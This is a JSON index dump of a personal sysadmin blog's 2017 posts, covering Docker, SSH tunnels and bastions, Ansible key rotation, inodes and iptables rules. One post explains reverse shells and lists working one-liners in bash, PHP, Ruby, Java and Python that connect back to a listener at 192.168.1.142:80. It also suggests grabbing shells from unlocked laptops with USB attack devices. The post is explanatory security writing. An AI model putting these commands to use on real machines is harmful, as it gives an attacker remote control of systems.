robot.brain.set(name, user); if(user.stage == 6 ){ msg.reply(\u0026#34;Hi \u0026#34;+user.name+\u0026#34;. You are \u0026#34;+user.age+\u0026#34;, \u0026#34;+user.gender+\u0026#34; and your favorite color is \u0026#34;+user.color); robot.brain.remove(name); } if(user.stage \u0026gt; 6 ){ delete user; robot.brain.remove(name); } } }); } ","permalink":"https://ridingintraffic.github.io/posts/2017-03-31-today/","summary":"Vault Storing secrets for docker containers can be tricky to get right. There is this thing called vault that does it pretty safely for you. The idea is that there should be nothing sensitve stored in the configuration of your containers. This is hard because when you need keys and passwords it is quite common to store those as environment variables and then refences those. You should not do that, that is bad.","title":"2017-03-31, vault, hubot"},{"content":"du 100G crashplan/ http://www.linfo.org/du.html\n","permalink":"https://ridingintraffic.github.io/posts/2017-04-05-du/","summary":"du 100G crashplan/ http://www.linfo.org/du.html","title":"2017-04-05, du"},{"content":"secrets in docker secret secret I\u0026rsquo;ve got a secret. It looks like hter is some stuff that is in docker 1.13.1 that allows you to do native secret storage\u0026hellip;. swarm-secrets-in-action/\nvortex keyboards I have two different vortex keyboards, the pok3r and the core 40%. I really like vortex keyboards. the only annoything thing is that their firmwares are only released as exe files and since I dont actually have anything that runs windows anymore, this presents a problem. Luckily the internet to the rescue. update-pok3r-rgb-firmware-on-macos long story short if you use virtulabox for mac and then go and download a windows VM for IE11 you can go and download hte xe then set virtualbox to forward the usb keyboard directly. This will give you firmware level access to the keyboard and the exe will work just as it should.\ndocker daemon watching the docker daemon is kind of a pain in the butt. Everyone has logging solutions setup for the container level but below that is the daemon and every once and a while somethinggoes wrong with the daemon and it would be nice to see why. The docker daemon by defualt logs out to syslog. Syslog has this thing called rsyslog which lets you essentially route messages directly to a udp port. Splunk has a nice feautre that allows you to isten to udp ports for data collections. a single conf file in the /etc/rsyslog.d/00-docker-rsyslog.conf containing the line. :msg,contains,\u0026quot;docker\u0026quot; @192.168.1.296:514 will take any message contining docker and then pipe it over to my splunk indexer on that given port. Bam you get the docker daemon logs in to splunk while still writing the rest of the syslog messagesto the log files on the host.\nbricker bot Nasty bit of code that is running around. If it finds a vulnerable IoT device it goes and kills it. new-malware-intentionally-bricks-iot-devices\nWrite random bits to the device\u0026rsquo;s storage drives, rendering flash storage useless. Disables TCP timestamps (sets net.ipv4.tcp_timestamps=0). Internet connectivity is left intact, but hampered. Sets the maximum number of kernel threads to one (kernel.threads-max=1). Since this value is usually in the range of tens of thousands, this effectively stops all kernel operations. Reboots the device. ","permalink":"https://ridingintraffic.github.io/posts/2017-04-06-secrets/","summary":"secrets in docker secret secret I\u0026rsquo;ve got a secret. It looks like hter is some stuff that is in docker 1.13.1 that allows you to do native secret storage\u0026hellip;. swarm-secrets-in-action/\nvortex keyboards I have two different vortex keyboards, the pok3r and the core 40%. I really like vortex keyboards. the only annoything thing is that their firmwares are only released as exe files and since I dont actually have anything that runs windows anymore, this presents a problem.","title":"2017-04-06, secrets, docker, vortex keyboards, brickerBot"},{"content":"new month Lets hope that I can get back in the swing of things with what I learned. The past month has been pretty chaos filled and I have not been very good at updating this. Here we go.\n","permalink":"https://ridingintraffic.github.io/posts/2017-05-01-newmonth/","summary":"new month Lets hope that I can get back in the swing of things with what I learned. The past month has been pretty chaos filled and I have not been very good at updating this. Here we go.","title":"2017-05-01, do over"},{"content":"Headless chrome headless Chrome\nthis allows you to run chrome headless style. This can allow you to script chrome. This could lead to some interesting things.\nkali virtual becuase I dont like to run around with extra laptops I got kali up and running virutally. Yea I know I miss a few things with it this way but I don\u0026rsquo;t mind. Kali virtualbox Networking is turning out to be a PITA, which means that the best way to do networking with Virtualbox and kali is to just use a usb wifi dongle. Of course I do not have one of those with me, I will have to get ont from home and plug it in later.\npi hole for blocking ads\u0026hellip; Pi hole does dns level based ad blocking which could be interesting got kali up and running virutally. Yea I know I miss a few things with it this way but I don\u0026rsquo;t mind. setup pihole\n","permalink":"https://ridingintraffic.github.io/posts/2017-05-02-chrome/","summary":"Headless chrome headless Chrome\nthis allows you to run chrome headless style. This can allow you to script chrome. This could lead to some interesting things.\nkali virtual becuase I dont like to run around with extra laptops I got kali up and running virutally. Yea I know I miss a few things with it this way but I don\u0026rsquo;t mind. Kali virtualbox Networking is turning out to be a PITA, which means that the best way to do networking with Virtualbox and kali is to just use a usb wifi dongle.","title":"2017-05-02, chrome"},{"content":"bullet journal conversion I have been using bullet journal for a time now and finding that the paper notebook is difficult for my lifestyle and for at work where I spend my life on the computer and I just don’t want to have to carry the notebook and my laptop with me every time. I understand that part of the concept of the bujo is to physically write things. However this is a difficult task when I carry my laptop around with me everywhere I go. It was not feasible to always carry a notebook and a laptop and my waterbottle whenever I would attend meetings. For a while i left he notebook behind and would add reminders and then transcribe them. However this fell off as I would again not have my notebook when I would have transcription time. Instead I have decided that a good option is to follow the same bujo rules of rewriting tasks per day and simply doing a digital version of a bujo in evernote.\nnegation logic If and not(this or that) is hard and makes my brain hurt a bit. Writing if not and/or logic gets very confusing very fast, discrete logic for the win.\n","permalink":"https://ridingintraffic.github.io/posts/2017-05-10-bujo/","summary":"bullet journal conversion I have been using bullet journal for a time now and finding that the paper notebook is difficult for my lifestyle and for at work where I spend my life on the computer and I just don’t want to have to carry the notebook and my laptop with me every time. I understand that part of the concept of the bujo is to physically write things. However this is a difficult task when I carry my laptop around with me everywhere I go.","title":"2017-05-10, bujo"},{"content":" Git all the things Git is fantastic and I try to use it wherever I can. However outside of git, source control is a must. If a system does not support source control or version-ing then you need to make something that does. F5 does not do an elegant source control. So, I wrote an interface for the rest API that run every hour in Jenkins. It downloads the irule data then adds it to git. This has saved my ass a few times now. Accidents happen and just being able to do side by side diffs on files makes debugging a giant sized easier.\n","permalink":"https://ridingintraffic.github.io/posts/2017-05-11-things/","summary":"Git all the things Git is fantastic and I try to use it wherever I can. However outside of git, source control is a must. If a system does not support source control or version-ing then you need to make something that does. F5 does not do an elegant source control. So, I wrote an interface for the rest API that run every hour in Jenkins. It downloads the irule data then adds it to git.","title":"2017-05-11, things"},{"content":"akamai user segmentation cloudlet Akamai is a massive CDN. When someone needs to do an A-B test or a phased rollout a cdn makes things a bit tricky. There are these things called cloudlets that the cdn can leverage to do other magic tasks. One of those tasks is an AB test. Where when you have a cached paged the cloudlet can be configured to tunnel through the cache and send the traffic for a various experiment back to the origin. The real sneaky things come in when you combine audience segmentation with load balancer rules that do all sorts of magic routing based ont he fields and variables that audience segmentation can provide. Link HERE \u0026raquo; audience-segmentation\nThere is a bit of a brief here: akamai-audience-segmentation-cloudlet-product-brief.pdf\nRegex akamai user segmentaiton can use regex but of course it is a very specific kind of regex. Syntax\nascii art is cool Asii art or the creation of images and fun things with plain text. Who doesnt love ascii art\u0026hellip; here are a bunch of on eliners that I am adding into my digital bullet journal in order to help the creative juice flow. ascii art\n","permalink":"https://ridingintraffic.github.io/posts/2017-05-12-akamai/","summary":"akamai user segmentation cloudlet Akamai is a massive CDN. When someone needs to do an A-B test or a phased rollout a cdn makes things a bit tricky. There are these things called cloudlets that the cdn can leverage to do other magic tasks. One of those tasks is an AB test. Where when you have a cached paged the cloudlet can be configured to tunnel through the cache and send the traffic for a various experiment back to the origin.","title":"2017-05-12, akamai"},{"content":"SSH Sometimes you jsut need to ssh in to a specific port on a host, becuase well running ssh on a standard port is often a bad idea. ssh asdfasdf -p 80` (lowercase p)\nscp Again if ssh is then running on a different port you are going to need to use scp on a different port. A similar syntax is needed for that.\nscp -P 80 \u0026hellip; # Use port 80 to bypass the firewall, instead of the scp default (uppercase P)\n#nmap nmap cheat sheet nmap-cheatsheet-a-quick-reference-guide\niptables!\nflooding of RST packets, smurf attack Rejection iptables -A INPUT -p tcp -m tcp \u0026ndash;tcp-flags RST RST -m limit \u0026ndash;limit 2/second \u0026ndash;limit-burst 2 -j ACCEPT\nProtecting portscans Attacking IP will be locked for 24 hours (3600 x 24 = 86400 Seconds) iptables -A INPUT -m recent \u0026ndash;name portscan \u0026ndash;rcheck \u0026ndash;seconds 86400 -j DROP iptables -A FORWARD -m recent \u0026ndash;name portscan \u0026ndash;rcheck \u0026ndash;seconds 86400 -j DROP\nRemove attacking IP after 24 hours iptables -A INPUT -m recent \u0026ndash;name portscan \u0026ndash;remove iptables -A FORWARD -m recent \u0026ndash;name portscan \u0026ndash;remove\nThese rules add scanners to the portscan list, and log the attempt. iptables -A INPUT -p tcp -m tcp \u0026ndash;dport 139 -m recent \u0026ndash;name portscan \u0026ndash;set -j LOG \u0026ndash;log-prefix \u0026ldquo;portscan:\u0026rdquo; iptables -A INPUT -p tcp -m tcp \u0026ndash;dport 139 -m recent \u0026ndash;name portscan \u0026ndash;set -j DROP\niptables -A FORWARD -p tcp -m tcp \u0026ndash;dport 139 -m recent \u0026ndash;name portscan \u0026ndash;set -j LOG \u0026ndash;log-prefix \u0026ldquo;portscan:\u0026rdquo; iptables -A FORWARD -p tcp -m tcp \u0026ndash;dport 139 -m recent \u0026ndash;name portscan \u0026ndash;set -j DROP\nhttp://sharadchhetri.com/2013/06/15/how-to-protect-from-port-scanning-and-smurf-attack-in-linux-server-by-iptables/\nsurfing as googlebot http://proggblo.blogspot.com/2013/09/how-to-surf-as-googlebot-in-chrome-easy.html\n","permalink":"https://ridingintraffic.github.io/posts/2017-05-16-pi/","summary":"SSH Sometimes you jsut need to ssh in to a specific port on a host, becuase well running ssh on a standard port is often a bad idea. ssh asdfasdf -p 80` (lowercase p)\nscp Again if ssh is then running on a different port you are going to need to use scp on a different port. A similar syntax is needed for that.\nscp -P 80 \u0026hellip; # Use port 80 to bypass the firewall, instead of the scp default (uppercase P)","title":"2017-05-16, pi"},{"content":"sublime from the terminal I live in a terminal but I am not great at vim yet so lets embed sublime instead of vim\u0026hellip;\nln -s /Applications/Sublime\\ Text.app/Contents/SharedSupport/bin/subl /usr/local/bin/sublime\nthis creates a symlink for the sublime cli command so you can run\nsublime filename (replace \u0026ldquo;filename\u0026rdquo; by an actual file name) or sublime foldername (replace \u0026ldquo;foldername\u0026rdquo; by an actual folder name) or even sublime . (to open the entire current directory)\ngist explainaing sublime command line\ntmux issues sublime cannot be launched form inside of tmux\u0026hellip; lets fix this.\nfix-open-command-tmux-osx\nranger I guess that I never talked about ranger before ranger is a file vrowser and previewer that lets you quickly see file contents from the browser and then dive right in to vim from their. ranger github repo\ngrep trick of the day Lets find just symlinks in a folder because sometimes you have a bunch of files in there and finding only symlinks is a pain. ls -lA | grep -e \u0026quot;-\u0026gt;\u0026quot;\nrouting proxies The concept of a routing proxy is kind of like a load balncer but it is much more complicated there are a couple different routing proxies that are gaining traction istio zuul\n","permalink":"https://ridingintraffic.github.io/posts/2017-06-07-tmux/","summary":"sublime from the terminal I live in a terminal but I am not great at vim yet so lets embed sublime instead of vim\u0026hellip;\nln -s /Applications/Sublime\\ Text.app/Contents/SharedSupport/bin/subl /usr/local/bin/sublime\nthis creates a symlink for the sublime cli command so you can run\nsublime filename (replace \u0026ldquo;filename\u0026rdquo; by an actual file name) or sublime foldername (replace \u0026ldquo;foldername\u0026rdquo; by an actual folder name) or even sublime . (to open the entire current directory)","title":"2017-06-07, tmux, sublime, ranger, grep"},{"content":"BitBar Bitbar is a handy extension that you can use with Macos that allows things in the notification bar at the top of the screen. The excellent part about it, is that it uses python to render the data. Python rocks which means it is super simple to get any and all data in there. linke to find bitbar is here: bitbar\n","permalink":"https://ridingintraffic.github.io/posts/2017-06-12-bitbar/","summary":"BitBar Bitbar is a handy extension that you can use with Macos that allows things in the notification bar at the top of the screen. The excellent part about it, is that it uses python to render the data. Python rocks which means it is super simple to get any and all data in there. linke to find bitbar is here: bitbar","title":"2017-06-12, bitbar"},{"content":"Node profiling There is a handy dandy performance profileer that I made use of today. nodejs-dashboard nodejs-dashboard It is easily configured to be added at runtime with: nodejs-dashboard -- node -r nodejs-dashboard index.js if you check the git repo you can see all the magic that can be done with the dashboards. I find it useful for heap usage and cpu.\ndocker gotcha There is a feature in docker called autorestart. Autorestart is a service-level setting that can automatically start your containers if they stop or crash. Depending how you are doing the storage mapper for docker, if you are using devicemapper and mounting that. Then when you restarts are tirggered it will use all of the device mapper it used before, at this point it maps more space. Depending how muc your space your container is using it can quickly chew up all of the device mapper storage space on your host.\n","permalink":"https://ridingintraffic.github.io/posts/2017-06-21-profiling/","summary":"Node profiling There is a handy dandy performance profileer that I made use of today. nodejs-dashboard nodejs-dashboard It is easily configured to be added at runtime with: nodejs-dashboard -- node -r nodejs-dashboard index.js if you check the git repo you can see all the magic that can be done with the dashboards. I find it useful for heap usage and cpu.\ndocker gotcha There is a feature in docker called autorestart.","title":"2017-06-21, profiling"},{"content":"changing root username to groot First things first, if you are going to do this you should have a root shell already open. If you do any of these commands as sudo, odds are good it won\u0026rsquo;t work.\nHonestly who doesn\u0026rsquo;t want to see all of the old files owned by root suddenly become owned by groot?!?! This has got to be the best worst idea I have had in a while.\nI changed the account name in /etc/passwd, /etc/shadow, /etc/group, and /etc/gshadow and /etc/sudoers. Then grepped for the name root in /etc/ grep -r \u0026quot;root\u0026quot; /etc/ \u0026quot;\nThen you can also create an alias in your .bashrc file that contains alias iamgroot=’sudo su - groot’\nThere is plenty of discusssion around this being a bad idea but who cares. I have an extra box laying around that I will turn in to my groot box. Disucssion on the topic can be found at how-do-you-rename-root\n","permalink":"https://ridingintraffic.github.io/posts/2017-06-28-iamgroot/","summary":"changing root username to groot First things first, if you are going to do this you should have a root shell already open. If you do any of these commands as sudo, odds are good it won\u0026rsquo;t work.\nHonestly who doesn\u0026rsquo;t want to see all of the old files owned by root suddenly become owned by groot?!?! This has got to be the best worst idea I have had in a while.","title":"2017-06-28, i am groot"},{"content":"SSH I use ssh all day all the time. But usually it is pretty standard login, shared keys and move into my tmux session. Other times its used a saved command to open a tunnel and doing some port forwards. Today and the last couple days I have tarted to fill in some of the bits and pieces to really configure ssh. That and I want to use ansible more to make my life easier, which of course leverages ssh quite a bit to get the job done.\nSSH config Tunnels! I have this really long command string that I was pasting into a shell. IT was a hassle but I had it wired up to alfred so it was not that big of a deal. I have a feeling a number of commands that I had wired up to alfred are also going to become ansible playbook or tasks in the near future. However that is a topic for later. But lets take my ssh tunnel command here ssh -L 9906:10.0.0.1:3306 -L 9907:10.0.0.1:3307 -L 9909:10.0.0.4:3309 coolio@database.example.com -p 4444 and with the config it gets truncated down to ssh tunnel-face OR go a step further and connect it just for the ports with -N, and backgrounded with -f.\n-N Do not execute a remote command. This is useful for just forwarding ports.\n-f Requests ssh to go to background just before command execution.\nssh -f -N tunnel-face\nHost tunnel-face HostName database.example.com Port 4444 IdentityFile ~/.ssh/coolio.example.key LocalForward 9906 10.0.0.1:3306 LocalForward 9907 10.0.0.1:3307 LocalForward 9909 10.0.0.4:3309 User coolio simplify-your-life-with-an-ssh-config\nMultiplexing Why have one when many are better. Next I want to speed up my ssh sessions because fast is better. That and you are going to want to make sure that the ssh mutliplex isn\u0026rsquo;t stay alive too long. There is a big difference between 10 min and a persistent multiplex. This connection is also going to be used as a bastion host so it is a great case to use the multiplex. Now the ssh config is going to look a bit longer.\nHost tunnel-face HostName database.example.com Port 4444 IdentityFile ~/.ssh/coolio.example.key ControlMaster auto ControlPersist 10m LocalForward 9906 10.0.0.1:3306 LocalForward 9907 10.0.0.1:3307 LocalForward 9909 10.0.0.4:3309 User coolio using-ssh-multiplexing\nBastion noun: Fortification. a projecting portion of a rampart or fortification. I use this host for 2 different kinds of access. The first is a pivot box with a tmux and active sessions, making my life a little lazier because i dont need to fire up all the connections all the time. However a different way to do this is to use it like a bastion server and spool up those connections locally and then tunnel them through the host. Different use cases for different tasks. Either way it allows all my ssh connection through that single port and therefore I have less open ports on the firewall. Less open ports is better. The tricky part is the reuse of bastion entry in the config and then linking the right keys to the right locations. Much like object oriented programming but from a configuration standpoint. My config now becomes this. `Host bastion IdentityFile ~/.ssh/id_rsa\nhost internal-test IdentityFile ~/.ssh/internal_key ProxyCommand ssh user1@bastion -p 3322 -W 10.0.0.1:22 User user2 I can connect to the internal host through the bastion host like thisssh internal-test` We are going to reuse the ssh key from the bastion stanza which will then connect to the internal-test using the internal key and user2. I know that may look a little confusing but just think it through a few times and it will make sense I promise.\nThe end. Thats it that is my saturday morning journey through some bits of ssh. Thank you to the folks who have written about this before and I tried to cite all the articles I read about it\nusing ssh bastion host\nssh multiplexing\nLinks links Just the links simplify-your-life-with-an-ssh-config\nusing-ssh-multiplexing\nssh multiplexing\nusing ssh bastion host\nopenbsd- man ssh freebsd- man ssh\n","permalink":"https://ridingintraffic.github.io/posts/2017-08-04-ssh--things/","summary":"SSH I use ssh all day all the time. But usually it is pretty standard login, shared keys and move into my tmux session. Other times its used a saved command to open a tunnel and doing some port forwards. Today and the last couple days I have tarted to fill in some of the bits and pieces to really configure ssh. That and I want to use ansible more to make my life easier, which of course leverages ssh quite a bit to get the job done.","title":"2017-08-05, ssh things"},{"content":"#SSH Key rotation! In some circles ssh key rotation is terrifying and considered a massive headache. In security circles the lack of key rotation is a ripe target to compromise ALL the things. How do we solve this?\nWell you can write a bash script that is going to go through a list of hosts and then do an ssh-copy-id to each host, but this is not going to invaliadate the old keys it is just going to dd the new ones. Only solving half of the issue. None the less for the initial setup of the solution this command is pretty nice none the less so here it is. ssh-copy-id -i ~/.ssh/mykey user@host\nhttps://www.ssh.com/ssh/copy-id\nSoultion anisible. Ansible is nothing new, it has been around for a while but it is surprising the number of folks that do not use it. Here is some info for ansible http://docs.ansible.com/. The feature that we are going to focus on is the authorized_key module http://docs.ansible.com/ansible/latest/authorized_key_module.html\nLab setup: SSH key already setup on each of the hosts that you are going to change. Ansible running on your laptop, which is where we are going to ssh from. Ansible inventory of the hosts with the shared ssh key. \u0026ndash; for my lab i am using a bunch of physical raspberry pis, because I like them and it makes me feel like a tiny mad scientist having a mini cluster of pi\u0026rsquo;s running on my desk. There were days that I would rather have a beuwolf cluster of machines running but hey you gotta make do. https://www.youtube.com/watch?v=8LsxmQV8AXk - switch to linux\nHere is an inventory example - simple enough\n[pi] 192.168.1.6 user=pi 192.168.1.7 user=pi 192.168.1.8 user=pi 192.168.1.9 user=pi Ansible is going to generate a new ssh key at a different location than my primary key because right now I am labbing this out and don\u0026rsquo;t want to break all the things. It is easy enough to use your central location, once we are out of lab stage. A future implementation is going to have a KMS of sorts so I can securely store all the keys but right now lets do this insecurely and we can discuss the best practice later. Vault-\u0026gt; https://www.vaultproject.io/docs/secrets/ssh/index.html\nGreat we have an inventory and our ssh key on each of the hosts.. Lets say hello world to our hosts to make sure the lab is configured\nansible pi -a \u0026ldquo;/bin/echo hello world\u0026rdquo; -i hosts -u pi \u0026ndash;private-key=\u0026quot;~/.ssh/id_rsa\n192.168.1.6 | SUCCESS | rc=0 \u0026gt;\u0026gt; hello world 92.168.1.7 | SUCCESS | rc=0 \u0026gt;\u0026gt; hello world 92.168.1.8 | SUCCESS | rc=0 \u0026gt;\u0026gt; hello world 92.168.1.9 | SUCCESS | rc=0 \u0026gt;\u0026gt; hello world Great it worked, next lets change the key and hope to not break everything. We are going to create an ansible playbook with a few tasks in it. First task is to generate a new ssh-key locally at our new location.\nname: \u0026#34;Set up authorized_keys for the root user\u0026#34; hosts: pi user: pi tasks: - name: Create new ssh key-pair local_action: command ssh-keygen -t rsa -N \u0026#34;\u0026#34; -q -f ~/test/id_rsa Next we will have a task that takes our new keyfile and pushes it to the hosts, using an exclusive command. The exclusive property is important because without it, we can retain the old keys. Or if we wanted to have multiple keys deployed we can do multiple steps, the first being the exclusive push and then appending our keys as we go.\n- name: Set up authorized_keys for the pi user authorized_key: user=pi key=\u0026#34;{{ item }}\u0026#34; state=present exclusive=yes with_file: - ~/test/id_rsa.pub Finally we have two steps to move the newly generated keys to our super secret archive, I have not worked this one out yet but cleanup is needed somewhere.\n- name: move key-pair local_action: command mv ~/test/id_rsa ~/test/id_rsa.bak run_once: true - name: move key-pair local_action: command mv ~/test/id_rsa.pub ~/test/id_rsa.pub.bak run_once: true putting it all together we get\n- name: \u0026#34;Set up authorized_keys for the root user\u0026#34; hosts: pi user: pi tasks: - name: Create new ssh key-pair local_action: command ssh-keygen -t rsa -N \u0026#34;\u0026#34; -q -f ~/test/id_rsa - name: Set up authorized_keys for the pi user #authorized_key: user=pi key=\u0026#34;{{ item }}\u0026#34; state=present exclusive=yes authorized_key: user=pi key=\u0026#34;{{ item }}\u0026#34; state=present exclusive=yes with_file: - ~/test/id_rsa.pub - name: move key-pair local_action: command mv ~/test/id_rsa ~/test/id_rsa.bak run_once: true - name: move key-pair local_action: command mv ~/test/id_rsa.pub ~/test/id_rsa.pub.bak run_once: true Lets fire it up and change some keys!\n$ ansible-playbook -i hosts playbook/ssh-key-push-revoke-old.yml PLAY [Set up authorized_keys for the root user] ******************************** TASK [setup] ******************************************************************* ok: [192.168.1.9] TASK [Create new ssh key-pair] ************************************************* changed: [192.168.1.9 -\u0026gt; localhost] TASK [Set up authorized_keys for the pi user] ********************************** changed: [192.168.1.9] =\u0026gt; (item=ssh-rsa xxxxx mikefettis@MAC2093.local) TASK [move key-pair] *********************************************************** changed: [192.168.1.9 -\u0026gt; localhost] TASK [move key-pair] *********************************************************** changed: [192.168.1.9 -\u0026gt; localhost] to retry, use: --limit @playbook/ssh-key-push-revoke-old.retry PLAY RECAP ********************************************************************* 192.168.1.9 : ok=1 changed=1 unreachable=0 failed=0 It worked! We rotated keys and we are more secure than we were an hour ago!!!\nthere are a ton of links i used diggning through this so I will include them all here https://derpops.bike/2014/06/07/ssh-key-rotation-with-ansible/ http://vicendominguez.blogspot.kr/2014/05/ansible-generating-pub-key-file-and.html\nansible docs: http://docs.ansible.com/ansible/latest/playbooks_intro.html http://docs.ansible.com/ansible/latest/authorized_key_module.html\nmanually ssh-copy-id https://www.ssh.com/ssh/copy-id\n","permalink":"https://ridingintraffic.github.io/posts/2017-08-19-ssh-keys/","summary":"#SSH Key rotation! In some circles ssh key rotation is terrifying and considered a massive headache. In security circles the lack of key rotation is a ripe target to compromise ALL the things. How do we solve this?\nWell you can write a bash script that is going to go through a list of hosts and then do an ssh-copy-id to each host, but this is not going to invaliadate the old keys it is just going to dd the new ones.","title":"2017-08-19 ssh-key-rotation"},{"content":"Local macos docker file system filled up Docker for macos has a bit of a bug that over time this file grows and chews up the availaable storage space that the daemon and containers are allowed to use. Even if you remove all containers, volumes and images, space usage will persist. The fix is to simply remove this one file. rm ~/Library/Containers/com.docker.docker/Data/com.docker.driver.amd64-linux/Docker.qcow2 and then restart docker I found it on docker fourms here: no-space-left-on-device-error\nSublimePrettyJson SublimePrettyJson https://github.com/dzhibas/SublimePrettyJson cmd+ctrl+j to make json blobs pretty\u0026hellip;. glorious\n","permalink":"https://ridingintraffic.github.io/posts/2017-08-23-macosdocker/","summary":"Local macos docker file system filled up Docker for macos has a bit of a bug that over time this file grows and chews up the availaable storage space that the daemon and containers are allowed to use. Even if you remove all containers, volumes and images, space usage will persist. The fix is to simply remove this one file. rm ~/Library/Containers/com.docker.docker/Data/com.docker.driver.amd64-linux/Docker.qcow2 and then restart docker I found it on docker fourms here: no-space-left-on-device-error","title":"2017-08-23, macos docker"},{"content":"filespace and inodes Reminder - you can run out of inodes on a system and still have plenty of space on it. We were seeing this error with jenkins Aug 25, 2017 3:14:33 PM net.bull.javamelody.JavaLogger warn WARNING: exception while collecting data: java.io.FileNotFoundException: /apps/jenkins/monitoring/xxx/http66ee24a2ec3f919f7da7c6a424e9dba4d059e1de.rrd (No space left on device) java.io.FileNotFoundException: /apps/jenkins/monitoring/xxx/http66ee24a2ec3f919f7da7c6a424e9dba4d059e1de.rrd (No space left on device)\nwhen I ran a df -h i saw $ df -h Filesystem Size Used Avail Use% Mounted on \u0026hellip; /dev/mapper/jenkinsvg-jenkinslv 20G 6.5G 13G 35% /apps/jenkins \u0026hellip;.\nGoogle search found this error hudson-fails-with-error-no-space-left-on-device-though-there-is-enough-space-o\nbut it turns out you can use df for inodes as well\n$ df -i Filesystem Inodes IUsed IFree IUse% Mounted on \u0026hellip; /dev/mapper/jenkinsvg-jenkinslv 1310720 1310720 0 100% /apps/jenkins \u0026hellip;\n","permalink":"https://ridingintraffic.github.io/posts/2017-08-25-dfi/","summary":"filespace and inodes Reminder - you can run out of inodes on a system and still have plenty of space on it. We were seeing this error with jenkins Aug 25, 2017 3:14:33 PM net.bull.javamelody.JavaLogger warn WARNING: exception while collecting data: java.io.FileNotFoundException: /apps/jenkins/monitoring/xxx/http66ee24a2ec3f919f7da7c6a424e9dba4d059e1de.rrd (No space left on device) java.io.FileNotFoundException: /apps/jenkins/monitoring/xxx/http66ee24a2ec3f919f7da7c6a424e9dba4d059e1de.rrd (No space left on device)\nwhen I ran a df -h i saw $ df -h Filesystem Size Used Avail Use% Mounted on \u0026hellip; /dev/mapper/jenkinsvg-jenkinslv 20G 6.","title":"2017-08-25, inodes"},{"content":"Whats a reverse shell? It’s that turtle that you jump on and it bounces off a wall and comes back at you right? Not quite but, you aren’t alone in ignorance. It is surprising that the number of folks that don’t actually know what a reverse shell is. Long story short, it is when one computer connects to another computer but the initiating computer forwards their shell to the destination. It is commonplace that a reverse shell happens during an attack or as part of a pentest. They are scary attacks because it gives an attacker an interactive shell on a machine that they should not have had access to inside of the “hardened” area. Lets break down how this works. First there is a machine listening somewhere on a specific tcp port. In this case using netcat.\n`nc -vlp 80` vlp? -v, --verbose Set verbosity level (can be used several times); -l, --listen Bind and listen for incoming connections; -p, --source-port port Specify source port to use (http://man7.org/linux/man-pages/man1/ncat.1.html) Simple enough, just a listener on a specific port. Second, we will need another machine, the victim, to connect to this machine and then forward the session to it. There are countless ways to setup this connection depending what resources are available. This is how to do it with bash bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.142/80 0\u0026gt;\u0026amp;1 The command bash -i \u0026gt;\u0026amp; invokes bash with an \u0026ldquo;interactive\u0026rdquo; option. Then /dev/tcp/192.168.1.142/7023 redirects that session to a tcp socket via device file. Finally 0\u0026gt;\u0026amp;1 Takes standard output, and connects it to standard input. It turns out linux has built a /dev/tcp device file. While powerful and useful this file can be extremely dangerous when used in this way. This built in device file lets bash connect directly to any ip and any port out there. This also works well if you want to confirm a port is open, or check the time.\n$ echo \u0026gt; /dev/tcp/192.168.1.142/22 -bash: connect: Connection refused. ( yey no ssh is open !) $ echo \u0026gt; /dev/tcp/www.google.com/80 $ cat \u0026lt;/dev/tcp/time.nist.gov/13 57991 17-08-26 13:39:06 50 0 0 0.0 UTC(NIST) http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip What’s so scary about this? Well, netcat can be listening on any port, and in the example it listened on port 80. This means that the connection and all the traffic flowing through that pipe is going to look like regular http traffic and if that port is open on one of your hosts (as it usually is) then it doesn’t matter what kind of firewall you have, it isn’t going to stop a reverse shell from owning you. Subsequently it doesn’t stop a machine from inside your firewall that has access to the internet coughcough laptops, from using the allowable port, and then pivoting to anything that can be accessible on the internal lan. Reverse shells are really fun to play with especially if you have something like a rubber ducky or a bash bunny. That lets you walk up to an unsecured laptop (that you have legitimate access to of course) and snag a shell. Then wait for your victim to come back and…\n$ say “im sorry dave i can’t let you do that, you should have locked your computer\u0026#34; $ sudo reboot https://hakshop.com/products/bash-bunny https://hakshop.com/products/usb-rubber-ducky-deluxe ``` Finally, here are examples of allowing a shell through in a whole bunch of different languages, because well not everything has bash, just most of the things. ``` Bash exec 5\u0026lt;\u0026gt;/dev/tcp/192.168.1.142/80 cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done # or: while read line 0\u0026lt;\u0026amp;5; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done PHP php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3”);’ (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6) RUBY ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d”,f,f,f)’ JAVA r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5\u0026lt;\u0026gt;/dev/tcp/192.168.1.142/80;cat \u0026lt;\u0026amp;5 | while read line; do \\$line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done”] as String[]) p.waitFor() PYTHON python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ ``` http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://highon.coffee/blog/reverse-shell-cheat-sheet/ ","permalink":"https://ridingintraffic.github.io/posts/2017-08-26-reverseshell/","summary":"Whats a reverse shell? It’s that turtle that you jump on and it bounces off a wall and comes back at you right? Not quite but, you aren’t alone in ignorance. It is surprising that the number of folks that don’t actually know what a reverse shell is. Long story short, it is when one computer connects to another computer but the initiating computer forwards their shell to the destination. It is commonplace that a reverse shell happens during an attack or as part of a pentest.","title":"2017-08-26, reverse shell"},{"content":"Furl Furl is a python package that enables the manipulation and use of urls. I think it is fantastic and much more readable than the string concat methods employed by many. github - furl\nHow does it work?\nfrom furl import furl f = furl(\u0026#39;https://someapi/v2/checks/data\u0026#39;) query_string={\u0026#34;range\u0026#34;:\u0026#34;last_hour\u0026#34;, \u0026#34;metrics\u0026#34;: [\u0026#34;server_time\u0026#34;, \u0026#34;dom_load_time\u0026#34;,\u0026#34;start_render\u0026#34;, 